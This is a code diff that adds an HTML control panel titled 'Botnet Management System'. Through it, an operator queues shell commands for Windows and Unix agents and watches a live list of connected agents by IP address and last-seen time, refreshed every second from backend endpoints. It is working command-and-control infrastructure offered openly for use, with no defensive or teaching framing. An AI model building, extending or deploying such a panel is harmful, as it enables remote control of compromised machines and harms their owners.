@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+        <meta charset="UTF-8">
+        <title>Botnet Management System</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <script src="https://code.jquery.com/jquery-3.1.1.js" integrity="sha256-16cdPddA6VdVInumRGo6IbivbERE8p7CQR3HzTBuELA=" crossorigin="anonymous"></script>
+        <script src="https://unpkg.com/vue/dist/vue.js"></script>
+        <script src="https://cdn.jsdelivr.net/lodash/4.17.2/lodash.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.17.1/moment.min.js"></script>
+        <link rel="stylesheet" href="https://unpkg.com/purecss@0.6.0/build/pure-min.css">
+
+        <style>
+            table {
+                width: 100%;
+            }
+
+            h1 {
+                margin-top: 50px;
+            }
+        </style>
+    </head>
+
+    <body>
+
+        <div id="app" class="pure-g">
+            <div class="pure-u-5-24"></div>
+
+            <div class="pure-u-14-24">
+
+                <h1>Commands</h1>
+                <table class="pure-table pure-table-bordered">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>OS</th>
+                            <th>Command</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+
+                    <tbody id="commands">
+
+                        <tr v-for="(c, index) in commands">
+                            <td>
+                                {{! index + 1 }}
+                            </td>
+                            <td>
+                                {{! c.os }}
+                            </td>
+                            <td>
+                                {{! c.cmd }}
+                            </td>
+                            <td>
+                                <button v-on:click="remove(c)" class="pure-button">
+                                    Remove
+                                </button>
+                            </td>
+                        </tr>
+
+                        <tr class="pure-table-odd">
+                            <td>
+                                New
+                            </td>
+                            <td></td>
+                            <td>
+                                <form class="pure-form">
+                                    <input id="name" 
+                                            type="text" 
+                                            placeholder="Command"
+                                            v-model="newCommand">
+                                </form>
+                            </td>
+                            <td>
+                                <button v-on:click="addNew('windows')" 
+                                        type="submit" 
+                                        class="pure-button pure-button-primary">
+                                    Add WIN
+                                </button>
+                                <button v-on:click="addNew('unix')" 
+                                        type="submit" 
+                                        class="pure-button pure-button-primary">
+                                    Add *NIX
+                                </button>
+                            </td>
+                        </tr>
+
+                    </tbody>
+                
+                </table>
+
+                <h1>Active Agents</h1>
+                <table class="pure-table pure-table-bordered">
+                    <thead>
+                        <tr>
+                            <th>#</th>
+                            <th>Remote IP</th>
+                            <th>Last seen</th>
+                        </tr>
+                    </thead>
+
+                    <tbody id="agents">
+                        <tr v-for="(a, index) in agents">
+                            <td>{{! index + 1 }}</td>
+                            <td>{{! a.ip }}</td>
+                            <td>{{! a.lastSeen }}</td>
+                        </tr>
+                    </tbody>
+                </table>
+
+            </div>
+
+            <div class="pure-u-5-24"></div>
+
+        </div>
+
+        <script type="text/javascript">
+
+            // Initializing commands component
+            (function(){
+                var commandsComponent = new Vue({
+                    el: '#commands',
+                    data: {
+                        commands: [],
+                        newCommand: undefined
+                    },
+                    methods: {
+                        remove: function(c) {
+                            $.ajax({
+                                url: '/commands_management?key=' + c.key + '&os=' + c.os,
+                                type: 'DELETE'
+                            });
+                        },
+                        addNew: function(os) {
+                            $.ajax({
+                                url: '/commands_management?cmd=' + this.newCommand + '&os=' + os,
+                                type: 'POST'
+                            });
+                        }
+                    }
+                });
+
+                var infinitelyPollCommands = function() {
+                    setTimeout(function() {
+                        jQuery.get('/commands_management')
+                            .then(function(response) {
+                                var nestedCommandsObject = JSON.parse(response); 
+
+                                commandsComponent.commands = _.reduce(
+                                    nestedCommandsObject, 
+                                    function(commands, nestedCommands, os) {
+                                        return commands.concat(_.map(nestedCommands, function(cmd, key) {
+                                            return {
+                                                os: os,
+                                                cmd: cmd,
+                                                key: key
+                                            };
+                                        }));
+                                    }, 
+                                    []);
+
+                                infinitelyPollCommands();
+                            })
+                            .catch(function() {
+                                infinitelyPollCommands();
+                            });
+                    }, 1000);
+                };
+
+                infinitelyPollCommands();
+
+            })();
+
+            // Initializing active agents component
+            (function() {
+
+                var agentsComponent = new Vue({
+                    el: '#agents',
+                    data: {
+                        agents: []
+                    }
+                });
+
+                var infinitelyPollAgents = function() {
+                    setTimeout(function() {
+                        jQuery.get('list_nodes')
+                            .then(function(response) {
+                                agentsComponent.agents = _.transform(
+                                    JSON.parse(response),
+                                    function(agents, value, key) {
+                                        console.log(value.last_seen);
+                                        agents.push({
+                                            ip: key,
+                                            lastSeen: moment(value.last_seen).format("YYYY-MM-DD HH:mm:ss.SSS")
+                                        });
+                                    },
+                                    []);
+                                infinitelyPollAgents();
+                            });
+                    }, 1000);
+                };
+
+                infinitelyPollAgents();                
+                
+            })();
+        </script>
+
+    </body>
+    
+</html>
